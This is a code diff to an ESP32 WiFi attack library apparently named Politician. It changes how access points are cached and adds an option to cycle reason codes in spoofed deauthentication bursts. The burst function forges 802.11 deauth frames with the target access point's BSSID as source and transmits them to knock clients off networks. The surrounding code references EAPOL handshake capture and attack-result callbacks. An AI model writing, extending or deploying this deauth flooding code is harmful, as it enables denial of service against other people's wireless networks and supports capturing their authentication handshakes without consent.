@@ -50,7 +50,6 @@ Politician::Politician()
       _customChannelCount(0),
       _eapolCb(nullptr), _apFoundCb(nullptr), _filterCb(nullptr),
       _logCb(nullptr), _attackResultCb(nullptr), _ignoreCount(0),
-      _apCacheCount(0),
       _fishState(FISH_IDLE), _fishStartMs(0), _fishRetry(0),
       _fishSsidLen(0), _fishChannel(1),
       _fishAuthLogged(false), _fishAssocLogged(false),
@@ -1572,7 +1571,21 @@ void Politician::_cacheAp(const uint8_t *bssid, const char *ssid, uint8_t ssid_l
             return;
         }
     }
-    int slot = _apCacheCount % MAX_AP_CACHE;
+    
+    int slot = -1;
+    uint32_t oldest_ms = UINT32_MAX;
+    for (int i = 0; i < MAX_AP_CACHE; i++) {
+        if (!_apCache[i].active) {
+            slot = i;
+            break;
+        }
+        if (_apCache[i].last_seen_ms < oldest_ms) {
+            oldest_ms = _apCache[i].last_seen_ms;
+            slot = i;
+        }
+    }
+    if (slot == -1) slot = 0;
+
     _apCache[slot].active = true; _apCache[slot].last_probe_ms = 0;
     _apCache[slot].last_stimulate_ms = 0; _apCache[slot].first_seen_ms = now; _apCache[slot].last_seen_ms = now;
     _apCache[slot].last_hidden_probe_ms = 0;
@@ -1587,7 +1600,6 @@ void Politician::_cacheAp(const uint8_t *bssid, const char *ssid, uint8_t ssid_l
     memcpy(_apCache[slot].bssid, bssid, 6); memcpy(_apCache[slot].ssid, ssid, ssid_len + 1);
     _apCache[slot].ssid_len = ssid_len; _apCache[slot].enc = enc; _apCache[slot].channel = channel;
     _apCache[slot].rssi = rssi; _apCache[slot].is_wpa3_only = is_wpa3_only;
-    _apCacheCount++;
 
     // Rogue AP detection: fire callback if another active AP shares the same SSID on the same channel
     if (_rogueApCb && ssid_len > 0) {
@@ -1741,15 +1753,21 @@ void Politician::_sendDeauthBurst(uint8_t count, const uint8_t *sta) {
         _fishBssid[0], _fishBssid[1], _fishBssid[2], _fishBssid[3], _fishBssid[4], _fishBssid[5], // SA (Spoofed AP)
         _fishBssid[0], _fishBssid[1], _fishBssid[2], _fishBssid[3], _fishBssid[4], _fishBssid[5], // BSSID (Spoofed AP)
         0x00, 0x00,              // Seq
-        _cfg.deauth_reason, 0x00 // Reason code (configurable, default 7)
+        _cfg.deauth_reason, 0x00 // Reason code (default 7)
     };
+
+    static const uint8_t REASONS[] = { 7, 1, 2, 4, 8, 15 };
+    uint8_t num_reasons = sizeof(REASONS);
 
     for (int i = 0; i < count; i++) {
         deauth[22] = (i << 4) & 0xFF;
+        if (_cfg.deauth_reason_cycling) {
+            deauth[24] = REASONS[i % num_reasons];
+        }
         esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
         delay(2);
     }
-    _log("[Deauth] Sent Reason 7 burst on ch%d (%s)\n", _fishChannel, (da[0] == 0xFF) ? "broadcast" : "unicast");
+    _log("[Deauth] Sent %s burst on ch%d (%s)\n", _cfg.deauth_reason_cycling ? "Fuzzing" : "Static", _fishChannel, (da[0] == 0xFF) ? "broadcast" : "unicast");
 }
 
 void Politician::_markCapturedSsidGroup(const char *ssid, uint8_t ssid_len) {
